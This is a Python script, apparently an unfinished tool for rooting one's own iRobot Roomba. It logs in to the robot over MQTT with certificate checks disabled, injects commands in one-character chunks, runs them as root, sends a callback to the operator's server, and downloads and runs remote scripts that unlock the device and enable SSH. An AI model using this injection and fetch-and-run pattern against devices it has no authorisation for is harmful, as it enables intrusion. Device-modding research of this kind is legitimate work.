# SOON...
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

httpd:HTTPServer|None = None

import paho.mqtt.client as mqtt
import ssl
import json

import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

import argparse

parser = argparse.ArgumentParser("runjailed")
parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID", required=True, type=str)
parser.add_argument("--password", "-p", dest="password", help="Your robot's password", required=True, type=str)
parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)

args = parser.parse_args()

LOCAL_IP = args.cb or get_local_ip()
DELTA = "delta"
RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
AVAILABLE_CMD_SPACE = 1

def sendCmd(cmd: str):
    if len(cmd) > 20:
        return False
    # TODO: Implement
    pass

def sendToScript(cmd: str, file: str):
    cmd = cmd.replace('"', '\\"')
    if len(cmd) > AVAILABLE_CMD_SPACE and cmd != '\\"': return False
    if len(file) > 1: return False
    sendCmd('printf "' + cmd + '">>/tmp/' + file)

def ensureCleared(file: str):
    if len(file) > 12: return False
    sendCmd('rm /tmp/' + file)

def intoChunks(cmd: str, size: int):
    return [cmd[i:i+size] for i in range(0, len(cmd), size)]

def sendChunkedCommand(cmd: str, file: str|None = "I", display=str|None):
    ensureCleared(file)
    chunks = intoChunks(cmd, AVAILABLE_CMD_SPACE)
    maxSize = str(len(chunks))
    for i, chunk in enumerate(chunks):
        sendToScript(chunk, file)
        chunkSent = "- Wrote chunk "+str(i)+"/"+maxSize
        print(chunkSent+("\b"*len(chunkSent)), end='', flush=True) 
    sendCmd("chmod a+x /tmp/"+ file)
    sendCmd("bash -c /tmp/" + file)
    print(f"$$$: {display or cmd}")

def runAsRoot(cmd: str, file:str="I"):
    sendChunkedCommand('/bin/busybox su -c \''+cmd+'\'', file, display=cmd)

def on_connect(client, userdata, flags, reason_code, properties):
    print("Connected successfully!")
    client.subscribe("$SYS/#")

def on_message(client, userdata, msg):
    pl = json.loads(msg.payload)
    if "shadow/update" in msg.topic:
        robotDat = pl['state']['reported']
        print("Discovered: " + robotDat['sku'] +" on " + robotDat['softwareVer'])
        runAsRoot(f"curl http://{LOCAL_IP}:8883/whoami/$(whoami)", "E")
        runAsRoot(f"mkdir -p {RUNJAILED_HOME}/scripts && wget https://raw.githubusercontent.com/ia74/roomba_rest980/refs/heads/main/runjailed/scripts/DOWNLOAD_ALL.sh -O {RUNJAILED_HOME}/scripts/DOWNLOAD_ALL.sh && chmod a+x {RUNJAILED_HOME}/scripts/DOWNLOAD_ALL.sh && bash -c \"{RUNJAILED_HOME}/scripts/DOWNLOAD_ALL.sh {LOCAL_IP}\"", "A")
        print("\nWorking... Don't close this! Commands are being sent over and executed.")
        print("This is a demonstration, soon this will become functional.")

class MyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        self.send_response(200)
        
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        
        if "done/downloading" in self.path:
          print("[SUCCESS] Downloaded all scripts, now unlocking!")
        if "done/unlocking" in self.path:
          print("[SUCCESS] Unlocked!")
        if "done/ssh" in self.path:
          print("[SUCCESS] Enabled SSH!")
        if "whoami/" in self.path:
          usr = self.path.split("whoami/")[1]
          pref = "[SUCCESS]" if "root" in usr else "[FAIL?]"
          print(pref+" Obtained " + usr +" access.")

server_address = ('', 8883)
httpd = HTTPServer(server_address, MyHandler)
      
t = threading.Thread(target=httpd.serve_forever, daemon=True)
t.start()

mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
mqttc.on_connect = on_connect
mqttc.on_message = on_message

mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
mqttc.tls_insecure_set(True) # The certificate is now expired. Expired on Dec 31 2025.

mqttc.username_pw_set(args.blid,args.password)
mqttc.connect(args.ip, 8883, 60)

mqttc.loop_forever()